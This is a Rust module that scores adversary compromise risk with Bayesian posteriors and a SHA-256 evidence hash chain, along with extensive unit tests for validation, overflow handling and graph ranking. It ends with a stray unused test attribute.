//! bd-274s: Deterministic Bayesian adversary graph.
//!
//! This module tracks adversary risk posterior values from evidence observations.
//! The update order and reduction are deterministic so identical evidence yields
//! identical posterior states.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

/// Hardening: Push with bounded capacity to prevent memory exhaustion attacks
fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow);
    }
    items.push(item);
}

pub const ADVERSARY_GRAPH_SCHEMA_VERSION: &str = "adversary-graph-state-v1";
pub const EVD_ADV_GRAPH_001: &str = "EVD-ADV-GRAPH-001";
pub const EVD_ADV_GRAPH_002: &str = "EVD-ADV-GRAPH-002";
const DEFAULT_PRIOR_ALPHA: u64 = 1;
const DEFAULT_PRIOR_BETA: u64 = 9;

#[derive(Debug, Clone, thiserror::Error, PartialEq)]
pub enum AdversaryGraphError {
    #[error("likelihood_compromise must be in [0.0, 1.0], got {value}")]
    InvalidLikelihood { value: f64 },
    #[error("evidence_weight must be > 0, got {value}")]
    InvalidEvidenceWeight { value: u64 },
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct AdversaryObservation {
    pub principal_id: String,
    pub likelihood_compromise: f64,
    pub evidence_weight: u64,
    pub evidence_ref: String,
    pub trace_id: String,
}

impl AdversaryObservation {
    pub fn new(
        principal_id: impl Into<String>,
        likelihood_compromise: f64,
        evidence_weight: u64,
        evidence_ref: impl Into<String>,
        trace_id: impl Into<String>,
    ) -> Result<Self, AdversaryGraphError> {
        validate_observation(likelihood_compromise, evidence_weight)?;
        Ok(Self {
            principal_id: principal_id.into(),
            likelihood_compromise,
            evidence_weight,
            evidence_ref: evidence_ref.into(),
            trace_id: trace_id.into(),
        })
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct AdversaryPosterior {
    pub principal_id: String,
    pub alpha: u64,
    pub beta: u64,
    pub posterior: f64,
    pub evidence_count: u64,
    pub last_trace_id: String,
    pub evidence_hash: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct AdversaryGraphSnapshot {
    pub schema_version: String,
    pub generated_at: String,
    pub posteriors: Vec<AdversaryPosterior>,
}

#[derive(Debug, Clone)]
struct AdversaryNode {
    alpha: u64,
    beta: u64,
    evidence_count: u64,
    last_trace_id: String,
    evidence_hash: String,
}

impl Default for AdversaryNode {
    fn default() -> Self {
        Self {
            alpha: DEFAULT_PRIOR_ALPHA,
            beta: DEFAULT_PRIOR_BETA,
            evidence_count: 0,
            last_trace_id: String::new(),
            evidence_hash: String::new(),
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct AdversaryGraph {
    nodes: BTreeMap<String, AdversaryNode>,
}

impl AdversaryGraph {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    pub fn ingest(
        &mut self,
        observation: &AdversaryObservation,
    ) -> Result<AdversaryPosterior, AdversaryGraphError> {
        validate_observation(
            observation.likelihood_compromise,
            observation.evidence_weight,
        )?;

        let (successes, failures) = split_weight(
            observation.likelihood_compromise,
            observation.evidence_weight,
        );

        let node = self
            .nodes
            .entry(observation.principal_id.clone())
            .or_default();
        node.alpha = node.alpha.saturating_add(successes);
        node.beta = node.beta.saturating_add(failures);
        node.evidence_count = node.evidence_count.saturating_add(1);
        node.last_trace_id = observation.trace_id.clone();
        node.evidence_hash = chain_evidence_hash(
            &node.evidence_hash,
            &observation.evidence_ref,
            &observation.trace_id,
            observation.likelihood_compromise,
            observation.evidence_weight,
        );

        let _event_code = EVD_ADV_GRAPH_001;
        Ok(project_posterior(&observation.principal_id, node))
    }

    pub fn replay_from(observations: &[AdversaryObservation]) -> Result<Self, AdversaryGraphError> {
        // Stable sort makes replay deterministic even if caller order is unstable.
        let mut ordered = observations.to_vec();
        ordered.sort_by(|left, right| {
            left.principal_id
                .cmp(&right.principal_id)
                .then_with(|| left.trace_id.cmp(&right.trace_id))
                .then_with(|| left.evidence_ref.cmp(&right.evidence_ref))
        });

        let mut graph = Self::new();
        for observation in &ordered {
            graph.ingest(observation)?;
        }

        let _event_code = EVD_ADV_GRAPH_002;
        Ok(graph)
    }

    #[must_use]
    pub fn posteriors(&self) -> Vec<AdversaryPosterior> {
        self.nodes
            .iter()
            .map(|(principal_id, node)| project_posterior(principal_id, node))
            .collect()
    }

    #[must_use]
    pub fn snapshot(&self, generated_at: impl Into<String>) -> AdversaryGraphSnapshot {
        AdversaryGraphSnapshot {
            schema_version: ADVERSARY_GRAPH_SCHEMA_VERSION.to_string(),
            generated_at: generated_at.into(),
            posteriors: self.posteriors(),
        }
    }
}

fn validate_observation(likelihood: f64, evidence_weight: u64) -> Result<(), AdversaryGraphError> {
    // Hardening: reject NaN/Inf to prevent silent failure in comparisons
    if !likelihood.is_finite() || !(0.0..=1.0).contains(&likelihood) {
        return Err(AdversaryGraphError::InvalidLikelihood { value: likelihood });
    }
    if evidence_weight == 0 {
        return Err(AdversaryGraphError::InvalidEvidenceWeight {
            value: evidence_weight,
        });
    }
    Ok(())
}

fn split_weight(likelihood: f64, evidence_weight: u64) -> (u64, u64) {
    // Hardening: guard f64 arithmetic against NaN/Inf
    if !likelihood.is_finite() {
        // Fail-safe: treat invalid likelihood as 0.0 (all failures)
        return (0, evidence_weight);
    }
    let product = likelihood * evidence_weight as f64;
    if !product.is_finite() {
        return (0, evidence_weight);
    }
    let rounded = product.round();
    if !rounded.is_finite() {
        return (0, evidence_weight);
    }
    let successes = if rounded >= 0.0 {
        (rounded as u64).min(evidence_weight)
    } else {
        0
    };
    let failures = evidence_weight.saturating_sub(successes);
    (successes, failures)
}

fn chain_evidence_hash(
    previous_hash: &str,
    evidence_ref: &str,
    trace_id: &str,
    likelihood: f64,
    evidence_weight: u64,
) -> String {
    // Hardening: length-prefixed hash inputs to prevent collision attacks
    let mut hasher = Sha256::new();
    hasher.update(b"adversary_graph_evidence_chain_v1:"); // domain separator
    hasher.update((u64::try_from(previous_hash.len()).unwrap_or(u64::MAX)).to_le_bytes());
    hasher.update(previous_hash.as_bytes());
    hasher.update((u64::try_from(evidence_ref.len()).unwrap_or(u64::MAX)).to_le_bytes());
    hasher.update(evidence_ref.as_bytes());
    hasher.update((u64::try_from(trace_id.len()).unwrap_or(u64::MAX)).to_le_bytes());
    hasher.update(trace_id.as_bytes());
    hasher.update(likelihood.to_le_bytes());
    hasher.update(evidence_weight.to_le_bytes());
    let digest = hasher.finalize();
    format!("sha256:{digest:x}")
}

fn project_posterior(principal_id: &str, node: &AdversaryNode) -> AdversaryPosterior {
    let total = node.alpha.saturating_add(node.beta);
    let posterior = if total > 0 {
        (node.alpha as f64) / (total as f64)
    } else {
        0.5 // fail-safe: uninformative prior when both alpha and beta are zero
    };
    AdversaryPosterior {
        principal_id: principal_id.to_string(),
        alpha: node.alpha,
        beta: node.beta,
        posterior,
        evidence_count: node.evidence_count,
        last_trace_id: node.last_trace_id.clone(),
        evidence_hash: node.evidence_hash.clone(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::{BTreeMap, BTreeSet};

    fn obs(
        principal_id: &str,
        likelihood_compromise: f64,
        evidence_weight: u64,
        evidence_ref: &str,
        trace_id: &str,
    ) -> AdversaryObservation {
        AdversaryObservation::new(
            principal_id,
            likelihood_compromise,
            evidence_weight,
            evidence_ref,
            trace_id,
        )
        .expect("valid observation")
    }

    #[derive(Debug, Clone, Copy)]
    struct TopologyEdge {
        from: &'static str,
        to: &'static str,
        weight: f64,
    }

    fn edge(from: &'static str, to: &'static str, weight: f64) -> TopologyEdge {
        TopologyEdge { from, to, weight }
    }

    fn clamp_edge_weight(weight: f64) -> f64 {
        if weight.is_finite() {
            weight.clamp(0.0, 1.0)
        } else {
            0.0
        }
    }

    fn topology_nodes(edges: &[TopologyEdge]) -> BTreeSet<&'static str> {
        let mut nodes = BTreeSet::new();
        for edge in edges {
            nodes.insert(edge.from);
            nodes.insert(edge.to);
        }
        nodes
    }

    fn topology_adjacency(
        edges: &[TopologyEdge],
    ) -> BTreeMap<&'static str, Vec<(&'static str, f64)>> {
        let mut adjacency: BTreeMap<&'static str, Vec<(&'static str, f64)>> = BTreeMap::new();
        for edge in edges {
            let weight = clamp_edge_weight(edge.weight);
            if weight > 0.0 {
                let adjacency_list = adjacency
                    .entry(edge.from)
                    .or_default();
                push_bounded(adjacency_list, (edge.to, weight), 1000);
            }
        }
        adjacency
    }

    fn visit_cycle(
        node: &'static str,
        adjacency: &BTreeMap<&'static str, Vec<(&'static str, f64)>>,
        marks: &mut BTreeMap<&'static str, u8>,
    ) -> bool {
        match marks.get(node).copied() {
            Some(1) => return true,
            Some(2) => return false,
            _ => {}
        }

        marks.insert(node, 1);
        if let Some(outgoing) = adjacency.get(node) {
            for (next, _) in outgoing {
                if visit_cycle(next, adjacency, marks) {
                    return true;
                }
            }
        }
        marks.insert(node, 2);
        false
    }

    fn topology_has_cycle(edges: &[TopologyEdge]) -> bool {
        let adjacency = topology_adjacency(edges);
        let mut marks = BTreeMap::new();
        for node in topology_nodes(edges) {
            if visit_cycle(node, &adjacency, &mut marks) {
                return true;
            }
        }
        false
    }

    fn converge_topology_rank(
        edges: &[TopologyEdge],
        iterations: usize,
    ) -> BTreeMap<&'static str, f64> {
        let nodes = topology_nodes(edges);
        let node_count = nodes.len();
        assert!(node_count > 0, "rank topology must contain nodes");
        let node_count_f64 = node_count as f64;
        let adjacency = topology_adjacency(edges);
        let damping = 0.85;
        let initial_rank = 1.0 / node_count_f64;
        let mut ranks: BTreeMap<&'static str, f64> =
            nodes.iter().map(|node| (*node, initial_rank)).collect();

        for _ in 0..iterations {
            let base_rank = (1.0 - damping) / node_count_f64;
            let mut next: BTreeMap<&'static str, f64> =
                nodes.iter().map(|node| (*node, base_rank)).collect();

            for node in &nodes {
                let source_rank = ranks.get(node).copied().unwrap_or(0.0);
                let Some(outgoing) = adjacency.get(node) else {
                    let contribution = damping * source_rank / node_count_f64;
                    for target in &nodes {
                        let updated = next.get(target).copied().unwrap_or(0.0) + contribution;
                        next.insert(*target, updated);
                    }
                    continue;
                };
                let total_weight: f64 = outgoing.iter().map(|(_, weight)| *weight).sum();
                if total_weight <= f64::EPSILON {
                    continue;
                }
                for (target, weight) in outgoing {
                    let contribution = damping * source_rank * (*weight / total_weight);
                    let updated = next.get(target).copied().unwrap_or(0.0) + contribution;
                    next.insert(*target, updated);
                }
            }

            ranks = next;
        }

        ranks
    }

    fn rank_delta(left: &BTreeMap<&'static str, f64>, right: &BTreeMap<&'static str, f64>) -> f64 {
        left.iter()
            .map(|(node, left_rank)| {
                let right_rank = right.get(node).copied().unwrap_or(0.0);
                (left_rank - right_rank).abs()
            })
            .sum()
    }

    #[test]
    fn deterministic_replay_yields_identical_posterior_state() {
        let observations = vec![
            obs("ext:a", 0.9, 8, "ev-1", "trace-2"),
            obs("ext:a", 0.8, 7, "ev-2", "trace-3"),
            obs("ext:b", 0.2, 4, "ev-3", "trace-1"),
        ];

        let a = AdversaryGraph::replay_from(&observations).expect("replay a");
        let b = AdversaryGraph::replay_from(&observations).expect("replay b");

        assert_eq!(
            a.snapshot("2026-02-22T05:00:00Z"),
            b.snapshot("2026-02-22T05:00:00Z")
        );
    }

    #[test]
    fn ingest_updates_posterior_and_evidence_chain() {
        let mut graph = AdversaryGraph::new();
        let first = graph
            .ingest(&obs("ext:a", 1.0, 10, "ev-1", "trace-1"))
            .expect("first");
        let second = graph
            .ingest(&obs("ext:a", 0.0, 2, "ev-2", "trace-2"))
            .expect("second");

        assert!(
            first.posterior > 0.5,
            "positive evidence should raise posterior"
        );
        assert!(
            second.evidence_count == 2,
            "evidence_count should increment"
        );
        assert_ne!(
            first.evidence_hash, second.evidence_hash,
            "evidence hash chain must evolve"
        );
    }

    #[test]
    fn weak_prior_starts_at_point_one_risk() {
        let mut graph = AdversaryGraph::new();
        let posterior = graph
            .ingest(&obs("ext:a", 1.0, 1, "ev-1", "trace-1"))
            .expect("ingest");

        assert_eq!(posterior.alpha, 2);
        assert_eq!(posterior.beta, 9);
        assert!(
            (posterior.posterior - (2.0 / 11.0)).abs() < 1e-12,
            "single adverse observation must be applied on top of the weak 1/9 prior"
        );
    }

    #[test]
    fn invalid_observation_rejected() {
        let err = AdversaryObservation::new("ext:a", 1.2, 2, "ev", "trace")
            .expect_err("must reject invalid likelihood");
        assert!(matches!(err, AdversaryGraphError::InvalidLikelihood { .. }));

        let err = AdversaryObservation::new("ext:a", 0.2, 0, "ev", "trace")
            .expect_err("must reject zero evidence weight");
        assert!(matches!(
            err,
            AdversaryGraphError::InvalidEvidenceWeight { .. }
        ));
    }

    #[test]
    fn snapshot_schema_and_order_are_stable() {
        let graph = AdversaryGraph::replay_from(&[
            obs("ext:z", 0.7, 3, "ev-z", "trace-z"),
            obs("ext:a", 0.7, 3, "ev-a", "trace-a"),
        ])
        .expect("replay");
        let snapshot = graph.snapshot("2026-02-22T05:00:00Z");

        assert_eq!(snapshot.schema_version, ADVERSARY_GRAPH_SCHEMA_VERSION);
        assert_eq!(snapshot.posteriors.len(), 2);
        assert_eq!(snapshot.posteriors[0].principal_id, "ext:a");
        assert_eq!(snapshot.posteriors[1].principal_id, "ext:z");
    }

    #[test]
    fn edge_weight_clamping_bounds_negative_overflow_and_nonfinite_inputs() {
        let cases = [
            (-1.0, 0.0),
            (0.0, 0.0),
            (0.42, 0.42),
            (1.0, 1.0),
            (1.5, 1.0),
            (f64::NAN, 0.0),
            (f64::INFINITY, 0.0),
            (f64::NEG_INFINITY, 0.0),
        ];

        for (input, expected) in cases {
            assert_eq!(clamp_edge_weight(input), expected);
        }
    }

    #[test]
    fn split_weight_clamps_successes_to_evidence_weight_at_upper_boundary() {
        let (successes, failures) = split_weight(1.0, u64::MAX);

        assert_eq!(successes, u64::MAX);
        assert_eq!(failures, 0);
        assert_eq!(successes.saturating_add(failures), u64::MAX);
    }

    #[test]
    fn cycle_detection_finds_self_loop() {
        let topology = [edge("ext:self", "ext:self", 0.7)];

        assert!(topology_has_cycle(&topology));
    }

    #[test]
    fn cycle_detection_finds_multi_node_adversarial_ring() {
        let topology = [
            edge("ext:a", "ext:b", 0.8),
            edge("ext:b", "ext:c", 0.6),
            edge("ext:c", "ext:a", 0.4),
            edge("ext:c", "ext:d", 0.2),
        ];

        assert!(topology_has_cycle(&topology));
    }

    #[test]
    fn cycle_detection_ignores_clamped_zero_weight_back_edges() {
        let topology = [
            edge("ext:a", "ext:b", 0.8),
            edge("ext:b", "ext:c", 0.6),
            edge("ext:c", "ext:a", -1.0),
            edge("ext:c", "ext:d", f64::NAN),
        ];

        assert!(!topology_has_cycle(&topology));
    }

    #[test]
    fn rank_converges_under_weighted_adversarial_cycle() {
        let topology = [
            edge("ext:attacker", "ext:victim", 1.0),
            edge("ext:victim", "ext:relay", 0.6),
            edge("ext:relay", "ext:attacker", 0.8),
            edge("ext:relay", "ext:victim", 0.2),
            edge("ext:benign", "ext:victim", 0.1),
        ];

        let rank_40 = converge_topology_rank(&topology, 40);
        let rank_80 = converge_topology_rank(&topology, 80);

        assert!(
            rank_delta(&rank_40, &rank_80) < 1e-9,
            "rank should converge under cyclic adversarial topology"
        );
    }

    #[test]
    fn rank_convergence_identifies_sybil_hub_above_leaf_nodes() {
        let topology = [
            edge("ext:sybil-1", "ext:hub", 1.0),
            edge("ext:sybil-2", "ext:hub", 1.0),
            edge("ext:sybil-3", "ext:hub", 1.0),
            edge("ext:sybil-4", "ext:hub", 1.0),
            edge("ext:hub", "ext:target", 0.9),
            edge("ext:target", "ext:hub", 0.7),
            edge("ext:benign", "ext:target", 0.2),
        ];

        let ranks = converge_topology_rank(&topology, 80);
        let hub = ranks["ext:hub"];

        assert!(hub > ranks["ext:sybil-1"]);
        assert!(hub > ranks["ext:sybil-2"]);
        assert!(hub > ranks["ext:benign"]);
    }

    #[test]
    fn rank_distribution_stays_normalized_with_clamped_edges() {
        let topology = [
            edge("ext:a", "ext:b", 2.0),
            edge("ext:b", "ext:c", f64::INFINITY),
            edge("ext:c", "ext:a", 0.5),
            edge("ext:d", "ext:a", f64::NAN),
            edge("ext:d", "ext:c", 0.4),
        ];

        let ranks = converge_topology_rank(&topology, 80);
        let total_rank: f64 = ranks.values().sum();

        assert!((total_rank - 1.0).abs() < 1e-9);
        assert!(ranks.values().all(|rank| rank.is_finite()));
        assert!(ranks.values().all(|rank| (0.0..=1.0).contains(rank)));
    }

    mod adversary_graph_additional_negative_tests {
        use super::*;
        use crate::security::constant_time::ct_eq_bytes;

        fn raw_observation(
            likelihood_compromise: f64,
            evidence_weight: u64,
        ) -> AdversaryObservation {
            AdversaryObservation {
                principal_id: "ext:raw".to_string(),
                likelihood_compromise,
                evidence_weight,
                evidence_ref: "ev-raw".to_string(),
                trace_id: "trace-raw".to_string(),
            }
        }

        #[test]
        fn constructor_rejects_nan_likelihood() {
            let err = AdversaryObservation::new("ext:nan", f64::NAN, 1, "ev-nan", "trace-nan")
                .expect_err("NaN compromise likelihood must fail closed");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidLikelihood { value } if value.is_nan()
            ));
        }

        #[test]
        fn constructor_rejects_infinite_likelihoods() {
            for value in [f64::INFINITY, f64::NEG_INFINITY] {
                let err = AdversaryObservation::new("ext:inf", value, 1, "ev-inf", "trace-inf")
                    .expect_err("infinite compromise likelihood must fail closed");

                assert!(matches!(
                    err,
                    AdversaryGraphError::InvalidLikelihood { value: rejected }
                        if rejected.is_infinite()
                ));
            }
        }

        #[test]
        fn ingest_revalidates_manually_constructed_zero_weight_observation() {
            let mut graph = AdversaryGraph::new();
            let observation = raw_observation(0.5, 0);

            let err = graph
                .ingest(&observation)
                .expect_err("public observation fields must be revalidated at ingest");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidEvidenceWeight { value: 0 }
            ));
            assert!(graph.posteriors().is_empty());
        }

        #[test]
        fn replay_from_rejects_raw_nonfinite_observation() {
            let observations = [
                obs("ext:valid", 0.5, 2, "ev-valid", "trace-valid"),
                raw_observation(f64::NAN, 2),
            ];

            let err = AdversaryGraph::replay_from(&observations)
                .expect_err("replay must reject non-finite raw observations");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidLikelihood { value } if value.is_nan()
            ));
        }

        #[test]
        fn split_weight_treats_nonfinite_likelihood_as_all_failures() {
            for value in [f64::NAN, f64::INFINITY, f64::NEG_INFINITY] {
                let (successes, failures) = split_weight(value, 17);

                assert_eq!(successes, 0);
                assert_eq!(failures, 17);
            }
        }

        #[test]
        fn chain_hash_domain_separates_rebound_string_fields() {
            let left = chain_evidence_hash("ab", "c", "trace", 0.25, 4);
            let right = chain_evidence_hash("a", "bc", "trace", 0.25, 4);

            assert!(left.starts_with("sha256:"));
            assert!(right.starts_with("sha256:"));
            assert!(!ct_eq_bytes(left.as_bytes(), right.as_bytes()));
        }

        #[test]
        fn chain_hash_domain_separates_trace_rebinding() {
            let left = chain_evidence_hash("", "ev", "trace-a", 0.75, 8);
            let right = chain_evidence_hash("", "evtrace-", "a", 0.75, 8);

            assert!(!ct_eq_bytes(left.as_bytes(), right.as_bytes()));
        }

        #[test]
        fn saturated_posterior_projection_stays_finite() {
            let node = AdversaryNode {
                alpha: u64::MAX,
                beta: u64::MAX,
                evidence_count: u64::MAX,
                last_trace_id: "trace-saturated".to_string(),
                evidence_hash: "sha256:saturated".to_string(),
            };

            let posterior = project_posterior("ext:saturated", &node);

            assert!(posterior.posterior.is_finite());
            assert!((0.0..=1.0).contains(&posterior.posterior));
            assert_eq!(posterior.evidence_count, u64::MAX);
            assert!(posterior.evidence_hash.starts_with("sha256:"));
        }

        #[test]
        fn constructor_rejects_negative_likelihood() {
            let err = AdversaryObservation::new("ext:neg", -0.001, 1, "ev-neg", "trace-neg")
                .expect_err("negative compromise likelihood must fail closed");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidLikelihood { value }
                    if value.to_bits() == (-0.001f64).to_bits()
            ));
        }

        #[test]
        fn constructor_rejects_likelihood_above_one() {
            let err = AdversaryObservation::new("ext:high", 1.001, 1, "ev-high", "trace-high")
                .expect_err("likelihood above one must fail closed");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidLikelihood { value }
                    if value.to_bits() == 1.001f64.to_bits()
            ));
        }

        #[test]
        fn ingest_revalidates_raw_negative_likelihood_without_mutating_graph() {
            let mut graph = AdversaryGraph::new();
            let observation = raw_observation(-0.5, 4);

            let err = graph
                .ingest(&observation)
                .expect_err("raw negative likelihood must be rejected at ingest");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidLikelihood { value }
                    if value.to_bits() == (-0.5f64).to_bits()
            ));
            assert!(graph.posteriors().is_empty());
        }

        #[test]
        fn ingest_revalidates_raw_above_one_likelihood_without_mutating_graph() {
            let mut graph = AdversaryGraph::new();
            let observation = raw_observation(1.5, 4);

            let err = graph
                .ingest(&observation)
                .expect_err("raw likelihood above one must be rejected at ingest");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidLikelihood { value }
                    if value.to_bits() == 1.5f64.to_bits()
            ));
            assert!(graph.posteriors().is_empty());
        }

        #[test]
        fn replay_from_rejects_raw_zero_weight_observation() {
            let observations = [
                obs("ext:valid", 0.5, 2, "ev-valid", "trace-valid"),
                raw_observation(0.5, 0),
            ];

            let err = AdversaryGraph::replay_from(&observations)
                .expect_err("replay must reject zero-weight raw observations");

            assert!(matches!(
                err,
                AdversaryGraphError::InvalidEvidenceWeight { value: 0 }
            ));
        }

        #[test]
        fn split_weight_direct_negative_likelihood_yields_all_failures() {
            let (successes, failures) = split_weight(-0.25, 9);

            assert_eq!(successes, 0);
            assert_eq!(failures, 9);
        }

        #[test]
        fn split_weight_direct_above_one_likelihood_clamps_to_weight() {
            let (successes, failures) = split_weight(1.25, 9);

            assert_eq!(successes, 9);
            assert_eq!(failures, 0);
        }

        #[test]
        fn ingest_max_weight_observation_saturates_alpha_without_overflow() {
            let mut graph = AdversaryGraph::new();

            let posterior = graph
                .ingest(&obs("ext:max-weight", 1.0, u64::MAX, "ev-max", "trace-max"))
                .expect("max-weight valid observation should saturate safely");

            assert_eq!(posterior.alpha, u64::MAX);
            assert_eq!(posterior.beta, DEFAULT_PRIOR_BETA);
            assert_eq!(posterior.evidence_count, 1);
            assert!(posterior.posterior.is_finite());
            assert!((0.0..=1.0).contains(&posterior.posterior));
        }
    }

    #[test]
    fn negative_chain_evidence_hash_with_maximum_field_lengths() {
        // Test hash chaining with very large field values
        let large_previous = "a".repeat(100000);
        let large_evidence = "b".repeat(100000);
        let large_trace = "c".repeat(100000);

        let hash = chain_evidence_hash(
            &large_previous,
            &large_evidence,
            &large_trace,
            0.5,
            42
        );

        assert!(hash.starts_with("sha256:"));
        assert_eq!(hash.len(), 71); // "sha256:" + 64 hex chars
        assert!(hash.chars().skip(7).all(|c| c.is_ascii_hexdigit() || c.is_ascii_lowercase()));
    }

    #[test]
    fn negative_chain_evidence_hash_unicode_collision_resistance() {
        // Test that Unicode normalization doesn't create hash collisions
        let nfc_evidence = "café";  // NFC normalized
        let nfd_evidence = "cafe\u{0301}";  // NFD normalized (e + combining acute)

        let hash_nfc = chain_evidence_hash("", nfc_evidence, "trace", 0.5, 1);
        let hash_nfd = chain_evidence_hash("", nfd_evidence, "trace", 0.5, 1);

        assert_ne!(hash_nfc, hash_nfd);
        assert!(!ct_eq_bytes(hash_nfc.as_bytes(), hash_nfd.as_bytes()));
    }

    #[test]
    fn negative_project_posterior_with_zero_total_returns_uninformative_prior() {
        let zero_node = AdversaryNode {
            alpha: 0,
            beta: 0,
            evidence_count: 0,
            last_trace_id: "zero-trace".to_string(),
            evidence_hash: "zero-hash".to_string(),
        };

        let posterior = project_posterior("ext:zero", &zero_node);

        assert_eq!(posterior.posterior, 0.5); // Uninformative prior
        assert!(posterior.posterior.is_finite());
        assert!((0.0..=1.0).contains(&posterior.posterior));
    }

    #[test]
    fn negative_adversary_graph_with_massive_principal_count() {
        let mut graph = AdversaryGraph::new();

        // Add many principals to test memory behavior
        for i in 0..10000 {
            let principal = format!("ext:principal_{:06}", i);
            graph.ingest(&obs(&principal, 0.1, 1, "ev-mass", "trace-mass")).unwrap();
        }

        let posteriors = graph.posteriors();
        assert_eq!(posteriors.len(), 10000);

        // Verify all posteriors are valid
        for posterior in &posteriors {
            assert!(posterior.posterior.is_finite());
            assert!((0.0..=1.0).contains(&posterior.posterior));
            assert!(posterior.principal_id.starts_with("ext:principal_"));
        }
    }

    #[test]
    fn negative_replay_from_with_extreme_ordering_edge_cases() {
        // Test replay with identical principal_id, trace_id, evidence_ref to stress sort stability
        let observations = vec![
            obs("ext:identical", 0.1, 1, "ev-same", "trace-same"),
            obs("ext:identical", 0.2, 2, "ev-same", "trace-same"),
            obs("ext:identical", 0.3, 3, "ev-same", "trace-same"),
        ];

        let graph = AdversaryGraph::replay_from(&observations).unwrap();
        let posteriors = graph.posteriors();

        assert_eq!(posteriors.len(), 1);
        let posterior = &posteriors[0];
        assert_eq!(posterior.evidence_count, 3);
        assert!(posterior.posterior.is_finite());
    }

    #[test]
    fn negative_split_weight_floating_point_precision_edge_cases() {
        // Test with values that might cause precision issues
        let precision_cases = [
            (f64::EPSILON, 1000),
            (1.0 - f64::EPSILON, 1000),
            (0.1 + 0.2, 1000), // Classic floating point precision issue
            (1.0 / 3.0, 999),  // Repeating decimal
        ];

        for (likelihood, weight) in precision_cases {
            let (successes, failures) = split_weight(likelihood, weight);

            assert!(successes <= weight);
            assert_eq!(successes + failures, weight);
            assert!(successes.saturating_add(failures) == weight);
        }
    }

    #[test]
    fn negative_observation_with_control_character_injection() {
        // Test with control characters in string fields
        let obs_with_controls = AdversaryObservation::new(
            "ext:control\0injection\r\n",
            0.5,
            1,
            "ev\tcontrol\x00ref",
            "trace\nwith\rcontrol\x1f"
        ).unwrap();

        let mut graph = AdversaryGraph::new();
        let posterior = graph.ingest(&obs_with_controls).unwrap();

        assert_eq!(posterior.principal_id, "ext:control\0injection\r\n");
        assert!(posterior.evidence_hash.starts_with("sha256:"));
        assert_eq!(posterior.last_trace_id, "trace\nwith\rcontrol\x1f");
    }

    #[test]
    fn negative_validate_observation_subnormal_float_boundaries() {
        // Test with subnormal float values near zero
        let subnormal_cases = [
            f64::MIN_POSITIVE,
            f64::MIN_POSITIVE / 2.0,
            2.0 * f64::MIN_POSITIVE,
            -f64::MIN_POSITIVE,
        ];

        for likelihood in subnormal_cases {
            let result = validate_observation(likelihood, 1);

            if likelihood >= 0.0 && likelihood <= 1.0 && likelihood.is_finite() {
                assert!(result.is_ok(), "Subnormal {} should be valid", likelihood);
            } else {
                assert!(result.is_err(), "Invalid subnormal {} should be rejected", likelihood);
            }
        }
    }

    #[test]
    fn negative_serialization_round_trip_with_extreme_values() {
        let extreme_observation = AdversaryObservation {
            principal_id: "\u{10FFFF}".repeat(1000), // Max Unicode codepoint repeated
            likelihood_compromise: f64::MIN_POSITIVE,
            evidence_weight: u64::MAX,
            evidence_ref: "\0".repeat(1000), // Null bytes
            trace_id: "🚀".repeat(1000), // Emoji
        };

        // Test serialization doesn't panic
        let serialized = serde_json::to_string(&extreme_observation).unwrap();
        assert!(!serialized.is_empty());

        // Test deserialization round-trip
        let deserialized: AdversaryObservation = serde_json::from_str(&serialized).unwrap();
        assert_eq!(extreme_observation, deserialized);
    }

    #[test]
    fn negative_evidence_chain_with_hash_collision_attempts() {
        // Test potential hash collision scenarios with similar inputs
        let collision_attempts = [
            ("prev_a", "evidence_b", "trace"),
            ("prev_", "aevidence_b", "trace"),
            ("pre", "v_aevidence_b", "trace"),
            ("", "prev_aevidence_b", "trace"),
        ];

        let mut hashes = std::collections::BTreeSet::new();
        for (prev, ev, trace) in collision_attempts {
            let hash = chain_evidence_hash(prev, ev, trace, 0.5, 42);
            assert!(hashes.insert(hash), "Hash collision detected");
        }

        assert_eq!(hashes.len(), collision_attempts.len());
    }

    #[test]
    fn negative_topology_edge_weight_with_denormal_and_zero_values() {
        // Test edge weight clamping with denormal values
        let edge_cases = [
            (0.0, 0.0),
            (-0.0, 0.0), // Negative zero
            (f64::MIN_POSITIVE / 2.0, f64::MIN_POSITIVE / 2.0), // Subnormal
            (f64::from_bits(1), f64::from_bits(1)), // Smallest positive denormal
        ];

        for (input, expected) in edge_cases {
            let result = clamp_edge_weight(input);
            assert_eq!(result, expected, "Failed for input {}", input);
            assert!(result.is_finite());
            assert!(result >= 0.0);
            assert!(result <= 1.0);
        }
    }

    #[test]
    fn negative_rank_convergence_with_all_zero_weights() {
        // Test rank convergence when all edges have zero weight
        let topology = [
            edge("ext:a", "ext:b", 0.0),
            edge("ext:b", "ext:c", -1.0), // Will be clamped to 0.0
            edge("ext:c", "ext:a", f64::NAN), // Will be clamped to 0.0
        ];

        let ranks = converge_topology_rank(&topology, 10);
        let total: f64 = ranks.values().sum();

        // Should maintain uniform distribution when no edges have weight
        assert!((total - 1.0).abs() < 1e-9);
        assert!(ranks.values().all(|r| (r - 1.0/3.0).abs() < 1e-6));
    }

    #[test]
    fn negative_adversary_posterior_arithmetic_overflow_scenarios() {
        let overflow_node = AdversaryNode {
            alpha: u64::MAX - 1,
            beta: 1,
            evidence_count: u64::MAX,
            last_trace_id: "overflow-test".to_string(),
            evidence_hash: "overflow-hash".to_string(),
        };

        let posterior = project_posterior("ext:overflow", &overflow_node);

        // Should handle near-overflow arithmetic safely
        assert!(posterior.posterior.is_finite());
        assert!((0.0..=1.0).contains(&posterior.posterior));
        assert!(posterior.posterior > 0.9); // Should be very high with these values
        assert_eq!(posterior.evidence_count, u64::MAX);
    }
}

#[cfg(test)]
